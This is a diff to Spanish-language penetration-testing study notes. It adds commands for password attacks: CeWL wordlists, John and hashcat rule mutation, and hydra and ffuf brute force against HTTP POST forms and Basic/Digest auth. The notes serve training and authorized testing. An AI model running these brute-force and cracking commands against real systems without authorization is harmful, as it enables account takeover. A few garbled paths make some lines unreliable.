@@ -9,7 +9,8 @@ hydra -C <user_pass.list> <protocol>://$target
 ## Crawling
 Una herramienta muy útil puede ser [CeWL](https://github.com/digininja/CeWL), que genera una lista de palabras a partir de una dirección web:
 ```bash
-cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+cewl https://www.inlanefreight.com -d 4 -m 6 -w inlane.wordlist
+# podríamos añadir la flag --lowercase, por ejemplo si lo queremos en minúsculas
 ```
 En este ejemplo `-d` indica la profundidad (depth) y `-m` indica el mínimo número de carácteres. Es útil combinar esto con algunas mutaciones 
 ## John the Ripper
@@ -45,7 +46,15 @@ Las reglas de las mutaciones las encontraremos en este archivo, que en kali est�
  cat /usr/share/john/john.conf | grep "\[List.Rules:" | sed 's/.*\[List.Rules:\(.*\)\].*/\1/' | sort -u
  cat /usr/share/john/john.conf | grep -oP '(?<=\[List.Rules:)[^\]]+' | sort -u
 ```
-
+- Podemos añadir una regla creada para `hashcat` añadiendo en la primera línea del archivo rules `[List.Rules:<nombreRegla>]`. Ejemplo suponiendo que `custom.rule` es una regla de `hashcat`: 
+```bash
+# Añadimos la primera línea a una regla personalizada de hashcat
+echo "[List.Rules:reglaSSH]" | cat - custom.rule > john.rule
+# Añadimos esta regla a las reglas personalizadas de john
+sudo sh -c 'cat john.rule >> /etc/john/john.conf'
+# Podemos utilizar la regla en john del siguiente modo: 
+john --wordlist=<wordlist_file> --rules=reglaSSH 
+```
 #### Mostrar mutaciones
 Podemos ver como se muta un diccionario al utilizar una regla escribiendo lo siguiente: 
 ```bash
@@ -70,8 +79,11 @@ En el ataque por diccionario hay que poner la opción `-a 0`, aunque si no espec
 Podemos crear diccionarios utilizando un [ataque basado en reglas](https://hashcat.net/wiki/doku.php?id=rule_based_attack) , utilizando un archivo `<nombre_archivo>.rule`
 ```bash
 hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+# Si solo queremos crear una regla, podemos utilarla junto con hashcat. Ej:
+ hashcat -m 0 md5hash /usr/share/wordlists/rockyou.txt -r custom.rule
 ```
-Podemos encontrar reglas en `/usr/share/hashcat/rules`. Una de las más conocidas es best64.rule
+Podemos encontrar reglas en `/usr/share/hashcat/rules`. Una de las más conocidas es `usrbest64.rule`. Otra regla interesante puede ser: `/usr/share/john/rule`
+`s/rockyou-30000.rule`
 ## Servicios de red 
 ### nxc 
 ```bash
@@ -99,13 +111,56 @@ smbclient -U user \\\\$target\\SHARENAME
 ### hydra
 Uso básico de la herramienta. Puede ser más lenta que alguna de las herrmaientas posteriores, pero es más completa
 ```bash
-hydra -L <user_list> -P <password_list> <protocol>://<target>
+hydra -L <user_list> -P <password_list> <protocol>://<target> -s <port_number>
 ```
-podemos utilizar `-l` ó `-p` para único usuario/password en vez de lista
+podemos utilizar `-l` ó `-p` para único usuario/password en vez de lista. Si no especificamos la flag `-s` atacará al puerto por defeto
 ```bash
 hydra -C <user_pass.list> <protocol>://<target>
 ```
 Donde `<user_pass.list>` es una  combinación de usuario y contraseña separados por `:`
+
+#### HTTP POST Login form
+- Podemos hacer fuerza bruta solicitudes tipo POST del siguiente modo (aunque fuzz suele ser más rápido para peticiones de tipo http): 
+	```bash
+	hydra -l user -P /usr/share/wordlists/rockyou.txt $target http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"
+	```
+	La opción `http-post-form` indica que el ataque será contra un formulario HTTP POST
+	Cada sección va separada por **dos puntos (`:`)**:
+	-  **Ruta del formulario**
+		- `"/index.php"` → Página donde está el formulario de login.
+	- **Cuerpo de la solicitud (`POST` data)**
+		- `"fm_usr=^USER^&fm_pwd=^PASS^"` → Parámetros enviados en el formulario.
+			(las palabras `^USER^` y `^PASS^` son **marcadores especiales (placeholders)** que **Hydra reemplaza automáticamente** por valores de la lista de usuarios y contraseñas)
+	- **Texto que indica un intento fallido**
+		- `"Login failed. Invalid"` → Cadena que aparece cuando la autenticación falla.
+#### HTTP Basic Auth / Digest Auth
+- Este tipo de autenticación ocurre cuando antes de entrar en la página nos encontramos con un cuadro emergente de autenticación. En este caso, las credenciales no se envían en el cuerpo de la solicitud, sino en la cabecera `Authorization`
+- Para saber que tipo de autenticación requiere, podemos hacer `curl -i http://$target` ó `curl -I http://$target` (solo cabeceras) y la respuesta nos dará el tipo de autenticación que necesitamos	 
+	```bash
+	# Basic auth nos dará como respuesta: 
+	WWW-Authenticate: Basic realm="Restricted Area"
+	# Digest auth nos dará como respuesta: 
+	WWW-Authenticate: Digest realm="Restricted Area"
+	```
+##### Basic Auth
+- Tenemos en la cabecera el campo `Authorization` con el formato
+	```bash
+	Authorization: Basic base64(usuario:contraseña)
+	```
+- Ataque con hydra:
+	```bash
+	hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt $target http-get
+	```
+- También se podría hacer con `ffuf`
+	```bash
+	ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ \ -H "Authorization: Basic $(echo -n 'admin:FUZZ' | base64)" \ -u "http://$target/"
+	```
+##### Digest Auth
+- Este tipo de autenticación no utiliza `base64`, sino un desafío `nonce` que cambia en cada intento, por lo que no se podría hacer un ataque de fuerza bruta con `ffuf` en este caso
+- Ataque con hydra 
+	```bash
+	hydra -L users.txt -P passwords.txt 192.168.244.201 http-digest-auth 
+	```
 ### Medusa
 Permite multitarget
 ```bash
